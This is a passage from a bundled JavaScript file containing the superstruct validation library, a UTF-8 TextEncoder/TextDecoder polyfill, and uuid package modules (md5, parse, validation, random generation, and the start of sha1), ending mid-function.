            return struct.coercer(value, ctx);
          }
        });
      }
      function omit(struct, keys) {
        const {
          schema
        } = struct;
        const subschema = {
          ...schema
        };
        for (const key of keys) {
          delete subschema[key];
        }
        return object(subschema);
      }
      function partial(struct) {
        const schema = struct instanceof Struct ? {
          ...struct.schema
        } : {
          ...struct
        };
        for (const key in schema) {
          schema[key] = optional(schema[key]);
        }
        return object(schema);
      }
      function pick(struct, keys) {
        const {
          schema
        } = struct;
        const subschema = {};
        for (const key of keys) {
          subschema[key] = schema[key];
        }
        return object(subschema);
      }
      function struct(name, validator) {
        console.warn('superstruct@0.11 - The `struct` helper has been renamed to `define`.');
        return define(name, validator);
      }
      function any() {
        return define('any', () => true);
      }
      function array(Element) {
        return new Struct({
          type: 'array',
          schema: Element,
          *entries(value) {
            if (Element && Array.isArray(value)) {
              for (const [i, v] of value.entries()) {
                yield [i, v, Element];
              }
            }
          },
          coercer(value) {
            return Array.isArray(value) ? value.slice() : value;
          },
          validator(value) {
            return Array.isArray(value) || "Expected an array value, but received: " + print(value);
          }
        });
      }
      function boolean() {
        return define('boolean', value => {
          return typeof value === 'boolean';
        });
      }
      function date() {
        return define('date', value => {
          return value instanceof Date && !isNaN(value.getTime()) || "Expected a valid `Date` object, but received: " + print(value);
        });
      }
      function enums(values) {
        const schema = {};
        const description = values.map(v => print(v)).join();
        for (const key of values) {
          schema[key] = key;
        }
        return new Struct({
          type: 'enums',
          schema,
          validator(value) {
            return values.includes(value) || "Expected one of `" + description + "`, but received: " + print(value);
          }
        });
      }
      function func() {
        return define('func', value => {
          return typeof value === 'function' || "Expected a function, but received: " + print(value);
        });
      }
      function instance(Class) {
        return define('instance', value => {
          return value instanceof Class || "Expected a `" + Class.name + "` instance, but received: " + print(value);
        });
      }
      function integer() {
        return define('integer', value => {
          return typeof value === 'number' && !isNaN(value) && Number.isInteger(value) || "Expected an integer, but received: " + print(value);
        });
      }
      function intersection(Structs) {
        return new Struct({
          type: 'intersection',
          schema: null,
          *entries(value, ctx) {
            for (const S of Structs) {
              yield* S.entries(value, ctx);
            }
          },
          *validator(value, ctx) {
            for (const S of Structs) {
              yield* S.validator(value, ctx);
            }
          },
          *refiner(value, ctx) {
            for (const S of Structs) {
              yield* S.refiner(value, ctx);
            }
          }
        });
      }
      function literal(constant) {
        const description = print(constant);
        const t = typeof constant;
        return new Struct({
          type: 'literal',
          schema: t === 'string' || t === 'number' || t === 'boolean' ? constant : null,
          validator(value) {
            return value === constant || "Expected the literal `" + description + "`, but received: " + print(value);
          }
        });
      }
      function map(Key, Value) {
        return new Struct({
          type: 'map',
          schema: null,
          *entries(value) {
            if (Key && Value && value instanceof Map) {
              for (const [k, v] of value.entries()) {
                yield [k, k, Key];
                yield [k, v, Value];
              }
            }
          },
          coercer(value) {
            return value instanceof Map ? new Map(value) : value;
          },
          validator(value) {
            return value instanceof Map || "Expected a `Map` object, but received: " + print(value);
          }
        });
      }
      function never() {
        return define('never', () => false);
      }
      function nullable(struct) {
        return new Struct({
          ...struct,
          validator: (value, ctx) => value === null || struct.validator(value, ctx),
          refiner: (value, ctx) => value === null || struct.refiner(value, ctx)
        });
      }
      function number() {
        return define('number', value => {
          return typeof value === 'number' && !isNaN(value) || "Expected a number, but received: " + print(value);
        });
      }
      function object(schema) {
        const knowns = schema ? Object.keys(schema) : [];
        const Never = never();
        return new Struct({
          type: 'object',
          schema: schema ? schema : null,
          *entries(value) {
            if (schema && isObject(value)) {
              const unknowns = new Set(Object.keys(value));
              for (const key of knowns) {
                unknowns.delete(key);
                yield [key, value[key], schema[key]];
              }
              for (const key of unknowns) {
                yield [key, value[key], Never];
              }
            }
          },
          validator(value) {
            return isObject(value) || "Expected an object, but received: " + print(value);
          },
          coercer(value) {
            return isObject(value) ? {
              ...value
            } : value;
          }
        });
      }
      function optional(struct) {
        return new Struct({
          ...struct,
          validator: (value, ctx) => value === undefined || struct.validator(value, ctx),
          refiner: (value, ctx) => value === undefined || struct.refiner(value, ctx)
        });
      }
      function record(Key, Value) {
        return new Struct({
          type: 'record',
          schema: null,
          *entries(value) {
            if (isObject(value)) {
              for (const k in value) {
                const v = value[k];
                yield [k, k, Key];
                yield [k, v, Value];
              }
            }
          },
          validator(value) {
            return isObject(value) || "Expected an object, but received: " + print(value);
          }
        });
      }
      function regexp() {
        return define('regexp', value => {
          return value instanceof RegExp;
        });
      }
      function set(Element) {
        return new Struct({
          type: 'set',
          schema: null,
          *entries(value) {
            if (Element && value instanceof Set) {
              for (const v of value) {
                yield [v, v, Element];
              }
            }
          },
          coercer(value) {
            return value instanceof Set ? new Set(value) : value;
          },
          validator(value) {
            return value instanceof Set || "Expected a `Set` object, but received: " + print(value);
          }
        });
      }
      function string() {
        return define('string', value => {
          return typeof value === 'string' || "Expected a string, but received: " + print(value);
        });
      }
      function tuple(Elements) {
        const Never = never();
        return new Struct({
          type: 'tuple',
          schema: null,
          *entries(value) {
            if (Array.isArray(value)) {
              const length = Math.max(Elements.length, value.length);
              for (let i = 0; i < length; i++) {
                yield [i, value[i], Elements[i] || Never];
              }
            }
          },
          validator(value) {
            return Array.isArray(value) || "Expected an array, but received: " + print(value);
          }
        });
      }
      function type(schema) {
        const keys = Object.keys(schema);
        return new Struct({
          type: 'type',
          schema,
          *entries(value) {
            if (isObject(value)) {
              for (const k of keys) {
                yield [k, value[k], schema[k]];
              }
            }
          },
          validator(value) {
            return isObject(value) || "Expected an object, but received: " + print(value);
          }
        });
      }
      function union(Structs) {
        const description = Structs.map(s => s.type).join(' | ');
        return new Struct({
          type: 'union',
          schema: null,
          validator(value, ctx) {
            const failures = [];
            for (const S of Structs) {
              const [...tuples] = run(value, S, ctx);
              const [first] = tuples;
              if (!first[0]) {
                return [];
              } else {
                for (const [failure] of tuples) {
                  if (failure) {
                    failures.push(failure);
                  }
                }
              }
            }
            return ["Expected the value to satisfy a union of `" + description + "`, but received: " + print(value), ...failures];
          }
        });
      }
      function unknown() {
        return define('unknown', () => true);
      }
      function coerce(struct, condition, coercer) {
        return new Struct({
          ...struct,
          coercer: (value, ctx) => {
            return is(value, condition) ? struct.coercer(coercer(value, ctx), ctx) : struct.coercer(value, ctx);
          }
        });
      }
      function defaulted(struct, fallback, options = {}) {
        return coerce(struct, unknown(), x => {
          const f = typeof fallback === 'function' ? fallback() : fallback;
          if (x === undefined) {
            return f;
          }
          if (!options.strict && isPlainObject(x) && isPlainObject(f)) {
            const ret = {
              ...x
            };
            let changed = false;
            for (const key in f) {
              if (ret[key] === undefined) {
                ret[key] = f[key];
                changed = true;
              }
            }
            if (changed) {
              return ret;
            }
          }
          return x;
        });
      }
      function trimmed(struct) {
        return coerce(struct, string(), x => x.trim());
      }
      function empty(struct) {
        const expected = "Expected an empty " + struct.type;
        return refine(struct, 'empty', value => {
          if (value instanceof Map || value instanceof Set) {
            const {
              size
            } = value;
            return size === 0 || expected + " but received one with a size of `" + size + "`";
          } else {
            const {
              length
            } = value;
            return length === 0 || expected + " but received one with a length of `" + length + "`";
          }
        });
      }
      function max(struct, threshold, options = {}) {
        const {
          exclusive
        } = options;
        return refine(struct, 'max', value => {
          return exclusive ? value < threshold : value <= threshold || "Expected a " + struct.type + " greater than " + (exclusive ? '' : 'or equal to ') + threshold + " but received `" + value + "`";
        });
      }
      function min(struct, threshold, options = {}) {
        const {
          exclusive
        } = options;
        return refine(struct, 'min', value => {
          return exclusive ? value > threshold : value >= threshold || "Expected a " + struct.type + " greater than " + (exclusive ? '' : 'or equal to ') + threshold + " but received `" + value + "`";
        });
      }
      function pattern(struct, regexp) {
        return refine(struct, 'pattern', value => {
          return regexp.test(value) || "Expected a " + struct.type + " matching `/" + regexp.source + "/` but received \"" + value + "\"";
        });
      }
      function size(struct, min, max = min) {
        const expected = "Expected a " + struct.type;
        const of = min === max ? "of `" + min + "`" : "between `" + min + "` and `" + max + "`";
        return refine(struct, 'size', value => {
          if (typeof value === 'number' || value instanceof Date) {
            return min <= value && value <= max || expected + " " + of + " but received `" + value + "`";
          } else if (value instanceof Map || value instanceof Set) {
            const {
              size
            } = value;
            return min <= size && size <= max || expected + " with a size " + of + " but received one with a size of `" + size + "`";
          } else {
            const {
              length
            } = value;
            return min <= length && length <= max || expected + " with a length " + of + " but received one with a length of `" + length + "`";
          }
        });
      }
      function refine(struct, name, refiner) {
        return new Struct({
          ...struct,
          *refiner(value, ctx) {
            yield* struct.refiner(value, ctx);
            const result = refiner(value, ctx);
            const failures = toFailures(result, ctx, struct, value);
            for (const failure of failures) {
              yield {
                ...failure,
                refinement: name
              };
            }
          }
        });
      }
      exports.Struct = Struct;
      exports.StructError = StructError;
      exports.any = any;
      exports.array = array;
      exports.assert = assert;
      exports.assign = assign;
      exports.boolean = boolean;
      exports.coerce = coerce;
      exports.create = create;
      exports.date = date;
      exports.defaulted = defaulted;
      exports.define = define;
      exports.deprecated = deprecated;
      exports.dynamic = dynamic;
      exports.empty = empty;
      exports.enums = enums;
      exports.func = func;
      exports.instance = instance;
      exports.integer = integer;
      exports.intersection = intersection;
      exports.is = is;
      exports.lazy = lazy;
      exports.literal = literal;
      exports.map = map;
      exports.mask = mask;
      exports.max = max;
      exports.min = min;
      exports.never = never;
      exports.nullable = nullable;
      exports.number = number;
      exports.object = object;
      exports.omit = omit;
      exports.optional = optional;
      exports.partial = partial;
      exports.pattern = pattern;
      exports.pick = pick;
      exports.record = record;
      exports.refine = refine;
      exports.regexp = regexp;
      exports.set = set;
      exports.size = size;
      exports.string = string;
      exports.struct = struct;
      exports.trimmed = trimmed;
      exports.tuple = tuple;
      exports.type = type;
      exports.union = union;
      exports.unknown = unknown;
      exports.validate = validate;
    }, {}],
    62: [function (require, module, exports) {
      'use strict';

      function inRange(a, min, max) {
        return min <= a && a <= max;
      }
      function ToDictionary(o) {
        if (o === undefined) return {};
        if (o === Object(o)) return o;
        throw TypeError('Could not convert argument to dictionary');
      }
      function stringToCodePoints(string) {
        var s = String(string);
        var n = s.length;
        var i = 0;
        var u = [];
        while (i < n) {
          var c = s.charCodeAt(i);
          if (c < 0xD800 || c > 0xDFFF) {
            u.push(c);
          } else if (0xDC00 <= c && c <= 0xDFFF) {
            u.push(0xFFFD);
          } else if (0xD800 <= c && c <= 0xDBFF) {
            if (i === n - 1) {
              u.push(0xFFFD);
            } else {
              var d = string.charCodeAt(i + 1);
              if (0xDC00 <= d && d <= 0xDFFF) {
                var a = c & 0x3FF;
                var b = d & 0x3FF;
                u.push(0x10000 + (a << 10) + b);
                i += 1;
              } else {
                u.push(0xFFFD);
              }
            }
          }
          i += 1;
        }
        return u;
      }
      function codePointsToString(code_points) {
        var s = '';
        for (var i = 0; i < code_points.length; ++i) {
          var cp = code_points[i];
          if (cp <= 0xFFFF) {
            s += String.fromCharCode(cp);
          } else {
            cp -= 0x10000;
            s += String.fromCharCode((cp >> 10) + 0xD800, (cp & 0x3FF) + 0xDC00);
          }
        }
        return s;
      }
      var end_of_stream = -1;
      function Stream(tokens) {
        this.tokens = [].slice.call(tokens);
      }
      Stream.prototype = {
        endOfStream: function () {
          return !this.tokens.length;
        },
        read: function () {
          if (!this.tokens.length) return end_of_stream;
          return this.tokens.shift();
        },
        prepend: function (token) {
          if (Array.isArray(token)) {
            var tokens = token;
            while (tokens.length) this.tokens.unshift(tokens.pop());
          } else {
            this.tokens.unshift(token);
          }
        },
        push: function (token) {
          if (Array.isArray(token)) {
            var tokens = token;
            while (tokens.length) this.tokens.push(tokens.shift());
          } else {
            this.tokens.push(token);
          }
        }
      };
      var finished = -1;
      function decoderError(fatal, opt_code_point) {
        if (fatal) throw TypeError('Decoder error');
        return opt_code_point || 0xFFFD;
      }
      var DEFAULT_ENCODING = 'utf-8';
      function TextDecoder(encoding, options) {
        if (!(this instanceof TextDecoder)) {
          return new TextDecoder(encoding, options);
        }
        encoding = encoding !== undefined ? String(encoding).toLowerCase() : DEFAULT_ENCODING;
        if (encoding !== DEFAULT_ENCODING) {
          throw new Error('Encoding not supported. Only utf-8 is supported');
        }
        options = ToDictionary(options);
        this._streaming = false;
        this._BOMseen = false;
        this._decoder = null;
        this._fatal = Boolean(options['fatal']);
        this._ignoreBOM = Boolean(options['ignoreBOM']);
        Object.defineProperty(this, 'encoding', {
          value: 'utf-8'
        });
        Object.defineProperty(this, 'fatal', {
          value: this._fatal
        });
        Object.defineProperty(this, 'ignoreBOM', {
          value: this._ignoreBOM
        });
      }
      TextDecoder.prototype = {
        decode: function decode(input, options) {
          var bytes;
          if (typeof input === 'object' && input instanceof ArrayBuffer) {
            bytes = new Uint8Array(input);
          } else if (typeof input === 'object' && 'buffer' in input && input.buffer instanceof ArrayBuffer) {
            bytes = new Uint8Array(input.buffer, input.byteOffset, input.byteLength);
          } else {
            bytes = new Uint8Array(0);
          }
          options = ToDictionary(options);
          if (!this._streaming) {
            this._decoder = new UTF8Decoder({
              fatal: this._fatal
            });
            this._BOMseen = false;
          }
          this._streaming = Boolean(options['stream']);
          var input_stream = new Stream(bytes);
          var code_points = [];
          var result;
          while (!input_stream.endOfStream()) {
            result = this._decoder.handler(input_stream, input_stream.read());
            if (result === finished) break;
            if (result === null) continue;
            if (Array.isArray(result)) code_points.push.apply(code_points, result);else code_points.push(result);
          }
          if (!this._streaming) {
            do {
              result = this._decoder.handler(input_stream, input_stream.read());
              if (result === finished) break;
              if (result === null) continue;
              if (Array.isArray(result)) code_points.push.apply(code_points, result);else code_points.push(result);
            } while (!input_stream.endOfStream());
            this._decoder = null;
          }
          if (code_points.length) {
            if (['utf-8'].indexOf(this.encoding) !== -1 && !this._ignoreBOM && !this._BOMseen) {
              if (code_points[0] === 0xFEFF) {
                this._BOMseen = true;
                code_points.shift();
              } else {
                this._BOMseen = true;
              }
            }
          }
          return codePointsToString(code_points);
        }
      };
      function TextEncoder(encoding, options) {
        if (!(this instanceof TextEncoder)) return new TextEncoder(encoding, options);
        encoding = encoding !== undefined ? String(encoding).toLowerCase() : DEFAULT_ENCODING;
        if (encoding !== DEFAULT_ENCODING) {
          throw new Error('Encoding not supported. Only utf-8 is supported');
        }
        options = ToDictionary(options);
        this._streaming = false;
        this._encoder = null;
        this._options = {
          fatal: Boolean(options['fatal'])
        };
        Object.defineProperty(this, 'encoding', {
          value: 'utf-8'
        });
      }
      TextEncoder.prototype = {
        encode: function encode(opt_string, options) {
          opt_string = opt_string ? String(opt_string) : '';
          options = ToDictionary(options);
          if (!this._streaming) this._encoder = new UTF8Encoder(this._options);
          this._streaming = Boolean(options['stream']);
          var bytes = [];
          var input_stream = new Stream(stringToCodePoints(opt_string));
          var result;
          while (!input_stream.endOfStream()) {
            result = this._encoder.handler(input_stream, input_stream.read());
            if (result === finished) break;
            if (Array.isArray(result)) bytes.push.apply(bytes, result);else bytes.push(result);
          }
          if (!this._streaming) {
            while (true) {
              result = this._encoder.handler(input_stream, input_stream.read());
              if (result === finished) break;
              if (Array.isArray(result)) bytes.push.apply(bytes, result);else bytes.push(result);
            }
            this._encoder = null;
          }
          return new Uint8Array(bytes);
        }
      };
      function UTF8Decoder(options) {
        var fatal = options.fatal;
        var utf8_code_point = 0,
          utf8_bytes_seen = 0,
          utf8_bytes_needed = 0,
          utf8_lower_boundary = 0x80,
          utf8_upper_boundary = 0xBF;
        this.handler = function (stream, bite) {
          if (bite === end_of_stream && utf8_bytes_needed !== 0) {
            utf8_bytes_needed = 0;
            return decoderError(fatal);
          }
          if (bite === end_of_stream) return finished;
          if (utf8_bytes_needed === 0) {
            if (inRange(bite, 0x00, 0x7F)) {
              return bite;
            }
            if (inRange(bite, 0xC2, 0xDF)) {
              utf8_bytes_needed = 1;
              utf8_code_point = bite - 0xC0;
            } else if (inRange(bite, 0xE0, 0xEF)) {
              if (bite === 0xE0) utf8_lower_boundary = 0xA0;
              if (bite === 0xED) utf8_upper_boundary = 0x9F;
              utf8_bytes_needed = 2;
              utf8_code_point = bite - 0xE0;
            } else if (inRange(bite, 0xF0, 0xF4)) {
              if (bite === 0xF0) utf8_lower_boundary = 0x90;
              if (bite === 0xF4) utf8_upper_boundary = 0x8F;
              utf8_bytes_needed = 3;
              utf8_code_point = bite - 0xF0;
            } else {
              return decoderError(fatal);
            }
            utf8_code_point = utf8_code_point << 6 * utf8_bytes_needed;
            return null;
          }
          if (!inRange(bite, utf8_lower_boundary, utf8_upper_boundary)) {
            utf8_code_point = utf8_bytes_needed = utf8_bytes_seen = 0;
            utf8_lower_boundary = 0x80;
            utf8_upper_boundary = 0xBF;
            stream.prepend(bite);
            return decoderError(fatal);
          }
          utf8_lower_boundary = 0x80;
          utf8_upper_boundary = 0xBF;
          utf8_bytes_seen += 1;
          utf8_code_point += bite - 0x80 << 6 * (utf8_bytes_needed - utf8_bytes_seen);
          if (utf8_bytes_seen !== utf8_bytes_needed) return null;
          var code_point = utf8_code_point;
          utf8_code_point = utf8_bytes_needed = utf8_bytes_seen = 0;
          return code_point;
        };
      }
      function UTF8Encoder(options) {
        var fatal = options.fatal;
        this.handler = function (stream, code_point) {
          if (code_point === end_of_stream) return finished;
          if (inRange(code_point, 0x0000, 0x007f)) return code_point;
          var count, offset;
          if (inRange(code_point, 0x0080, 0x07FF)) {
            count = 1;
            offset = 0xC0;
          } else if (inRange(code_point, 0x0800, 0xFFFF)) {
            count = 2;
            offset = 0xE0;
          } else if (inRange(code_point, 0x10000, 0x10FFFF)) {
            count = 3;
            offset = 0xF0;
          }
          var bytes = [(code_point >> 6 * count) + offset];
          while (count > 0) {
            var temp = code_point >> 6 * (count - 1);
            bytes.push(0x80 | temp & 0x3F);
            count -= 1;
          }
          return bytes;
        };
      }
      exports.TextEncoder = TextEncoder;
      exports.TextDecoder = TextDecoder;
    }, {}],
    63: [function (require, module, exports) {
      "use strict";

      Object.defineProperty(exports, "__esModule", {
        value: true
      });
      Object.defineProperty(exports, "v1", {
        enumerable: true,
        get: function () {
          return _v.default;
        }
      });
      Object.defineProperty(exports, "v3", {
        enumerable: true,
        get: function () {
          return _v2.default;
        }
      });
      Object.defineProperty(exports, "v4", {
        enumerable: true,
        get: function () {
          return _v3.default;
        }
      });
      Object.defineProperty(exports, "v5", {
        enumerable: true,
        get: function () {
          return _v4.default;
        }
      });
      Object.defineProperty(exports, "NIL", {
        enumerable: true,
        get: function () {
          return _nil.default;
        }
      });
      Object.defineProperty(exports, "version", {
        enumerable: true,
        get: function () {
          return _version.default;
        }
      });
      Object.defineProperty(exports, "validate", {
        enumerable: true,
        get: function () {
          return _validate.default;
        }
      });
      Object.defineProperty(exports, "stringify", {
        enumerable: true,
        get: function () {
          return _stringify.default;
        }
      });
      Object.defineProperty(exports, "parse", {
        enumerable: true,
        get: function () {
          return _parse.default;
        }
      });
      var _v = _interopRequireDefault(require("./v1.js"));
      var _v2 = _interopRequireDefault(require("./v3.js"));
      var _v3 = _interopRequireDefault(require("./v4.js"));
      var _v4 = _interopRequireDefault(require("./v5.js"));
      var _nil = _interopRequireDefault(require("./nil.js"));
      var _version = _interopRequireDefault(require("./version.js"));
      var _validate = _interopRequireDefault(require("./validate.js"));
      var _stringify = _interopRequireDefault(require("./stringify.js"));
      var _parse = _interopRequireDefault(require("./parse.js"));
      function _interopRequireDefault(obj) {
        return obj && obj.__esModule ? obj : {
          default: obj
        };
      }
    }, {
      "./nil.js": 65,
      "./parse.js": 66,
      "./stringify.js": 70,
      "./v1.js": 71,
      "./v3.js": 72,
      "./v4.js": 74,
      "./v5.js": 75,
      "./validate.js": 76,
      "./version.js": 77
    }],
    64: [function (require, module, exports) {
      "use strict";

      Object.defineProperty(exports, "__esModule", {
        value: true
      });
      exports.default = void 0;
      function md5(bytes) {
        if (typeof bytes === 'string') {
          const msg = unescape(encodeURIComponent(bytes));
          bytes = new Uint8Array(msg.length);
          for (let i = 0; i < msg.length; ++i) {
            bytes[i] = msg.charCodeAt(i);
          }
        }
        return md5ToHexEncodedArray(wordsToMd5(bytesToWords(bytes), bytes.length * 8));
      }
      function md5ToHexEncodedArray(input) {
        const output = [];
        const length32 = input.length * 32;
        const hexTab = '0123456789abcdef';
        for (let i = 0; i < length32; i += 8) {
          const x = input[i >> 5] >>> i % 32 & 0xff;
          const hex = parseInt(hexTab.charAt(x >>> 4 & 0x0f) + hexTab.charAt(x & 0x0f), 16);
          output.push(hex);
        }
        return output;
      }
      function getOutputLength(inputLength8) {
        return (inputLength8 + 64 >>> 9 << 4) + 14 + 1;
      }
      function wordsToMd5(x, len) {
        x[len >> 5] |= 0x80 << len % 32;
        x[getOutputLength(len) - 1] = len;
        let a = 1732584193;
        let b = -271733879;
        let c = -1732584194;
        let d = 271733878;
        for (let i = 0; i < x.length; i += 16) {
          const olda = a;
          const oldb = b;
          const oldc = c;
          const oldd = d;
          a = md5ff(a, b, c, d, x[i], 7, -680876936);
          d = md5ff(d, a, b, c, x[i + 1], 12, -389564586);
          c = md5ff(c, d, a, b, x[i + 2], 17, 606105819);
          b = md5ff(b, c, d, a, x[i + 3], 22, -1044525330);
          a = md5ff(a, b, c, d, x[i + 4], 7, -176418897);
          d = md5ff(d, a, b, c, x[i + 5], 12, 1200080426);
          c = md5ff(c, d, a, b, x[i + 6], 17, -1473231341);
          b = md5ff(b, c, d, a, x[i + 7], 22, -45705983);
          a = md5ff(a, b, c, d, x[i + 8], 7, 1770035416);
          d = md5ff(d, a, b, c, x[i + 9], 12, -1958414417);
          c = md5ff(c, d, a, b, x[i + 10], 17, -42063);
          b = md5ff(b, c, d, a, x[i + 11], 22, -1990404162);
          a = md5ff(a, b, c, d, x[i + 12], 7, 1804603682);
          d = md5ff(d, a, b, c, x[i + 13], 12, -40341101);
          c = md5ff(c, d, a, b, x[i + 14], 17, -1502002290);
          b = md5ff(b, c, d, a, x[i + 15], 22, 1236535329);
          a = md5gg(a, b, c, d, x[i + 1], 5, -165796510);
          d = md5gg(d, a, b, c, x[i + 6], 9, -1069501632);
          c = md5gg(c, d, a, b, x[i + 11], 14, 643717713);
          b = md5gg(b, c, d, a, x[i], 20, -373897302);
          a = md5gg(a, b, c, d, x[i + 5], 5, -701558691);
          d = md5gg(d, a, b, c, x[i + 10], 9, 38016083);
          c = md5gg(c, d, a, b, x[i + 15], 14, -660478335);
          b = md5gg(b, c, d, a, x[i + 4], 20, -405537848);
          a = md5gg(a, b, c, d, x[i + 9], 5, 568446438);
          d = md5gg(d, a, b, c, x[i + 14], 9, -1019803690);
          c = md5gg(c, d, a, b, x[i + 3], 14, -187363961);
          b = md5gg(b, c, d, a, x[i + 8], 20, 1163531501);
          a = md5gg(a, b, c, d, x[i + 13], 5, -1444681467);
          d = md5gg(d, a, b, c, x[i + 2], 9, -51403784);
          c = md5gg(c, d, a, b, x[i + 7], 14, 1735328473);
          b = md5gg(b, c, d, a, x[i + 12], 20, -1926607734);
          a = md5hh(a, b, c, d, x[i + 5], 4, -378558);
          d = md5hh(d, a, b, c, x[i + 8], 11, -2022574463);
          c = md5hh(c, d, a, b, x[i + 11], 16, 1839030562);
          b = md5hh(b, c, d, a, x[i + 14], 23, -35309556);
          a = md5hh(a, b, c, d, x[i + 1], 4, -1530992060);
          d = md5hh(d, a, b, c, x[i + 4], 11, 1272893353);
          c = md5hh(c, d, a, b, x[i + 7], 16, -155497632);
          b = md5hh(b, c, d, a, x[i + 10], 23, -1094730640);
          a = md5hh(a, b, c, d, x[i + 13], 4, 681279174);
          d = md5hh(d, a, b, c, x[i], 11, -358537222);
          c = md5hh(c, d, a, b, x[i + 3], 16, -722521979);
          b = md5hh(b, c, d, a, x[i + 6], 23, 76029189);
          a = md5hh(a, b, c, d, x[i + 9], 4, -640364487);
          d = md5hh(d, a, b, c, x[i + 12], 11, -421815835);
          c = md5hh(c, d, a, b, x[i + 15], 16, 530742520);
          b = md5hh(b, c, d, a, x[i + 2], 23, -995338651);
          a = md5ii(a, b, c, d, x[i], 6, -198630844);
          d = md5ii(d, a, b, c, x[i + 7], 10, 1126891415);
          c = md5ii(c, d, a, b, x[i + 14], 15, -1416354905);
          b = md5ii(b, c, d, a, x[i + 5], 21, -57434055);
          a = md5ii(a, b, c, d, x[i + 12], 6, 1700485571);
          d = md5ii(d, a, b, c, x[i + 3], 10, -1894986606);
          c = md5ii(c, d, a, b, x[i + 10], 15, -1051523);
          b = md5ii(b, c, d, a, x[i + 1], 21, -2054922799);
          a = md5ii(a, b, c, d, x[i + 8], 6, 1873313359);
          d = md5ii(d, a, b, c, x[i + 15], 10, -30611744);
          c = md5ii(c, d, a, b, x[i + 6], 15, -1560198380);
          b = md5ii(b, c, d, a, x[i + 13], 21, 1309151649);
          a = md5ii(a, b, c, d, x[i + 4], 6, -145523070);
          d = md5ii(d, a, b, c, x[i + 11], 10, -1120210379);
          c = md5ii(c, d, a, b, x[i + 2], 15, 718787259);
          b = md5ii(b, c, d, a, x[i + 9], 21, -343485551);
          a = safeAdd(a, olda);
          b = safeAdd(b, oldb);
          c = safeAdd(c, oldc);
          d = safeAdd(d, oldd);
        }
        return [a, b, c, d];
      }
      function bytesToWords(input) {
        if (input.length === 0) {
          return [];
        }
        const length8 = input.length * 8;
        const output = new Uint32Array(getOutputLength(length8));
        for (let i = 0; i < length8; i += 8) {
          output[i >> 5] |= (input[i / 8] & 0xff) << i % 32;
        }
        return output;
      }
      function safeAdd(x, y) {
        const lsw = (x & 0xffff) + (y & 0xffff);
        const msw = (x >> 16) + (y >> 16) + (lsw >> 16);
        return msw << 16 | lsw & 0xffff;
      }
      function bitRotateLeft(num, cnt) {
        return num << cnt | num >>> 32 - cnt;
      }
      function md5cmn(q, a, b, x, s, t) {
        return safeAdd(bitRotateLeft(safeAdd(safeAdd(a, q), safeAdd(x, t)), s), b);
      }
      function md5ff(a, b, c, d, x, s, t) {
        return md5cmn(b & c | ~b & d, a, b, x, s, t);
      }
      function md5gg(a, b, c, d, x, s, t) {
        return md5cmn(b & d | c & ~d, a, b, x, s, t);
      }
      function md5hh(a, b, c, d, x, s, t) {
        return md5cmn(b ^ c ^ d, a, b, x, s, t);
      }
      function md5ii(a, b, c, d, x, s, t) {
        return md5cmn(c ^ (b | ~d), a, b, x, s, t);
      }
      var _default = md5;
      exports.default = _default;
    }, {}],
    65: [function (require, module, exports) {
      "use strict";

      Object.defineProperty(exports, "__esModule", {
        value: true
      });
      exports.default = void 0;
      var _default = '00000000-0000-0000-0000-000000000000';
      exports.default = _default;
    }, {}],
    66: [function (require, module, exports) {
      "use strict";

      Object.defineProperty(exports, "__esModule", {
        value: true
      });
      exports.default = void 0;
      var _validate = _interopRequireDefault(require("./validate.js"));
      function _interopRequireDefault(obj) {
        return obj && obj.__esModule ? obj : {
          default: obj
        };
      }
      function parse(uuid) {
        if (!(0, _validate.default)(uuid)) {
          throw TypeError('Invalid UUID');
        }
        let v;
        const arr = new Uint8Array(16);
        arr[0] = (v = parseInt(uuid.slice(0, 8), 16)) >>> 24;
        arr[1] = v >>> 16 & 0xff;
        arr[2] = v >>> 8 & 0xff;
        arr[3] = v & 0xff;
        arr[4] = (v = parseInt(uuid.slice(9, 13), 16)) >>> 8;
        arr[5] = v & 0xff;
        arr[6] = (v = parseInt(uuid.slice(14, 18), 16)) >>> 8;
        arr[7] = v & 0xff;
        arr[8] = (v = parseInt(uuid.slice(19, 23), 16)) >>> 8;
        arr[9] = v & 0xff;
        arr[10] = (v = parseInt(uuid.slice(24, 36), 16)) / 0x10000000000 & 0xff;
        arr[11] = v / 0x100000000 & 0xff;
        arr[12] = v >>> 24 & 0xff;
        arr[13] = v >>> 16 & 0xff;
        arr[14] = v >>> 8 & 0xff;
        arr[15] = v & 0xff;
        return arr;
      }
      var _default = parse;
      exports.default = _default;
    }, {
      "./validate.js": 76
    }],
    67: [function (require, module, exports) {
      "use strict";

      Object.defineProperty(exports, "__esModule", {
        value: true
      });
      exports.default = void 0;
      var _default = /^(?:[0-9a-f]{8}-[0-9a-f]{4}-[1-5][0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}|00000000-0000-0000-0000-000000000000)$/i;
      exports.default = _default;
    }, {}],
    68: [function (require, module, exports) {
      "use strict";

      Object.defineProperty(exports, "__esModule", {
        value: true
      });
      exports.default = rng;
      let getRandomValues;
      const rnds8 = new Uint8Array(16);
      function rng() {
        if (!getRandomValues) {
          getRandomValues = typeof crypto !== 'undefined' && crypto.getRandomValues && crypto.getRandomValues.bind(crypto) || typeof msCrypto !== 'undefined' && typeof msCrypto.getRandomValues === 'function' && msCrypto.getRandomValues.bind(msCrypto);
          if (!getRandomValues) {
            throw new Error('crypto.getRandomValues() not supported. See https://github.com/uuidjs/uuid#getrandomvalues-not-supported');
          }
        }
        return getRandomValues(rnds8);
      }
    }, {}],
    69: [function (require, module, exports) {
      "use strict";

      Object.defineProperty(exports, "__esModule", {
        value: true
      });
      exports.default = void 0;
      function f(s, x, y, z) {
        switch (s) {
          case 0:
            return x & y ^ ~x & z;
          case 1:
            return x ^ y ^ z;
          case 2:
            return x & y ^ x & z ^ y & z;
          case 3:
            return x ^ y ^ z;
        }
      }
      function ROTL(x, n) {
        return x << n | x >>> 32 - n;
      }
      function sha1(bytes) {
        const K = [0x5a827999, 0x6ed9eba1, 0x8f1bbcdc, 0xca62c1d6];
        const H = [0x67452301, 0xefcdab89, 0x98badcfe, 0x10325476, 0xc3d2e1f0];
        if (typeof bytes === 'string') {
          const msg = unescape(encodeURIComponent(bytes));
          bytes = [];
          for (let i = 0; i < msg.length; ++i) {
            bytes.push(msg.charCodeAt(i));
          }
        } else if (!Array.isArray(bytes)) {
          bytes = Array.prototype.slice.call(bytes);
        }
        bytes.push(0x80);
        const l = bytes.length / 4 + 2;
        const N = Math.ceil(l / 16);
        const M = new Array(N);
        for (let i = 0; i < N; ++i) {
          const arr = new Uint32Array(16);
          for (let j = 0; j < 16; ++j) {
